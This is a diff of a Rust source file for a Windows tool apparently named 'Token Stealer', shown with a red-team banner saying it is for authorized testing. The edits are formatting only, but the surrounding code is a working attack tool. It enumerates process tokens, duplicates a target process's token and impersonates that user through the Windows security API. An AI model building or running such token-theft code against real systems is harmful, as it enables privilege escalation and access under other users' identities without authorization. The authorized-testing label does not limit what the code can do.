@@ -7,16 +7,19 @@ use std::env;
 
 #[cfg(windows)]
 mod token_ops {
+    use std::ffi::c_void;
+    use std::mem;
     use windows::Win32::Foundation::*;
     use windows::Win32::Security::*;
-    use windows::Win32::System::Threading::*;
     use windows::Win32::System::Diagnostics::ToolHelp::*;
-    use std::mem;
-    use std::ffi::c_void;
+    use windows::Win32::System::Threading::*;
 
     pub fn list_tokens() {
         println!("[*] Enumerating process tokens...\n");
-        println!("{:<8} | {:<30} | {:<15} | {}", "PID", "Process", "User", "Integrity");
+        println!(
+            "{:<8} | {:<30} | {:<15} | {}",
+            "PID", "Process", "User", "Integrity"
+        );
         println!("{}", "-".repeat(80));
 
         unsafe {
@@ -32,29 +35,37 @@ mod token_ops {
 
             if Process32FirstW(snapshot, &mut entry).is_ok() {
                 loop {
-                    let name: String = entry.szExeFile
+                    let name: String = entry
+                        .szExeFile
                         .iter()
                         .take_while(|&&c| c != 0)
                         .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                         .collect();
 
                     // Try to get token info
-                    if let Ok(handle) = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, entry.th32ProcessID) {
+                    if let Ok(handle) = OpenProcess(
+                        PROCESS_QUERY_LIMITED_INFORMATION,
+                        false,
+                        entry.th32ProcessID,
+                    ) {
                         let mut token = HANDLE::default();
                         if OpenProcessToken(handle, TOKEN_QUERY, &mut token).is_ok() {
                             let user = get_token_user(token).unwrap_or_else(|| "N/A".to_string());
-                            let integrity = get_token_integrity(token).unwrap_or_else(|| "N/A".to_string());
-                            
+                            let integrity =
+                                get_token_integrity(token).unwrap_or_else(|| "N/A".to_string());
+
                             // Truncate long names
-                            let name_display = if name.len() > 28 { 
-                                format!("{}…", &name[..27]) 
-                            } else { 
-                                name.clone() 
+                            let name_display = if name.len() > 28 {
+                                format!("{}…", &name[..27])
+                            } else {
+                                name.clone()
                             };
-                            
-                            println!("{:<8} | {:<30} | {:<15} | {}", 
-                                     entry.th32ProcessID, name_display, user, integrity);
-                            
+
+                            println!(
+                                "{:<8} | {:<30} | {:<15} | {}",
+                                entry.th32ProcessID, name_display, user, integrity
+                            );
+
                             let _ = CloseHandle(token);
                         }
                         let _ = CloseHandle(handle);
@@ -109,21 +120,23 @@ mod token_ops {
                 SecurityImpersonation,
                 TokenImpersonation,
                 &mut dup_token,
-            ).is_ok() {
+            )
+            .is_ok()
+            {
                 println!("\n[+] Token duplicated successfully!");
-                
+
                 // Impersonate
                 if ImpersonateLoggedOnUser(dup_token).is_ok() {
                     println!("[+] Now impersonating target token");
                     println!("[*] Whoami check would show impersonated user");
-                    
+
                     // Revert
                     let _ = RevertToSelf();
                     println!("[*] Reverted to original token");
                 } else {
                     eprintln!("[!] Impersonation failed");
                 }
-                
+
                 let _ = CloseHandle(dup_token);
             } else {
                 eprintln!("[!] Token duplication failed");
@@ -138,9 +151,11 @@ mod token_ops {
         unsafe {
             let mut size = 0u32;
             let _ = GetTokenInformation(token, TokenUser, None, 0, &mut size);
-            
-            if size == 0 { return None; }
-            
+
+            if size == 0 {
+                return None;
+            }
+
             let mut buffer = vec![0u8; size as usize];
             if GetTokenInformation(
                 token,
@@ -148,15 +163,17 @@ mod token_ops {
                 Some(buffer.as_mut_ptr() as *mut c_void),
                 size,
                 &mut size,
-            ).is_ok() {
+            )
+            .is_ok()
+            {
                 let token_user = &*(buffer.as_ptr() as *const TOKEN_USER);
-                
+
                 let mut name = [0u16; 256];
                 let mut domain = [0u16; 256];
                 let mut name_len = 256u32;
                 let mut domain_len = 256u32;
                 let mut sid_type = SID_NAME_USE::default();
-                
+
                 if LookupAccountSidW(
                     None,
                     token_user.User.Sid,
@@ -165,8 +182,11 @@ mod token_ops {
                     windows::core::PWSTR(domain.as_mut_ptr()),
                     &mut domain_len,
                     &mut sid_type,
-                ).is_ok() {
-                    let user: String = name[..name_len as usize].iter()
+                )
+                .is_ok()
+                {
+                    let user: String = name[..name_len as usize]
+                        .iter()
                         .take_while(|&&c| c != 0)
                         .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                         .collect();
@@ -181,9 +201,11 @@ mod token_ops {
         unsafe {
             let mut size = 0u32;
             let _ = GetTokenInformation(token, TokenIntegrityLevel, None, 0, &mut size);
-            
-            if size == 0 { return None; }
-            
+
+            if size == 0 {
+                return None;
+            }
+
             let mut buffer = vec![0u8; size as usize];
             if GetTokenInformation(
                 token,
@@ -191,14 +213,16 @@ mod token_ops {
                 Some(buffer.as_mut_ptr() as *mut c_void),
                 size,
                 &mut size,
-            ).is_ok() {
+            )
+            .is_ok()
+            {
                 let label = &*(buffer.as_ptr() as *const TOKEN_MANDATORY_LABEL);
                 let sid = label.Label.Sid;
-                
+
                 let sub_auth_count = *GetSidSubAuthorityCount(sid);
                 if sub_auth_count > 0 {
                     let rid = *GetSidSubAuthority(sid, sub_auth_count as u32 - 1);
-                    
+
                     let level = match rid {
                         0x0000 => "Untrusted",
                         0x1000 => "Low",
@@ -217,7 +241,8 @@ mod token_ops {
 }
 
 fn print_banner() {
-    println!(r#"
+    println!(
+        r#"
 ╔═══════════════════════════════════════════════════════════════╗
 ║  ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗                 ║
 ║  ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║                 ║
@@ -227,7 +252,8 @@ fn print_banner() {
 ║     ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝                 ║
 ║            STEALER - Access Token Tool v0.1                    ║
 ╚═══════════════════════════════════════════════════════════════╝
-"#);
+"#
+    );
     println!("⚠  FOR AUTHORIZED SECURITY TESTING ONLY\n");
 }
 
@@ -241,9 +267,9 @@ fn print_usage(prog: &str) {
 
 fn main() {
     print_banner();
-    
+
     let args: Vec<String> = env::args().collect();
-    
+
     if args.len() < 2 {
         print_usage(&args[0]);
         return;
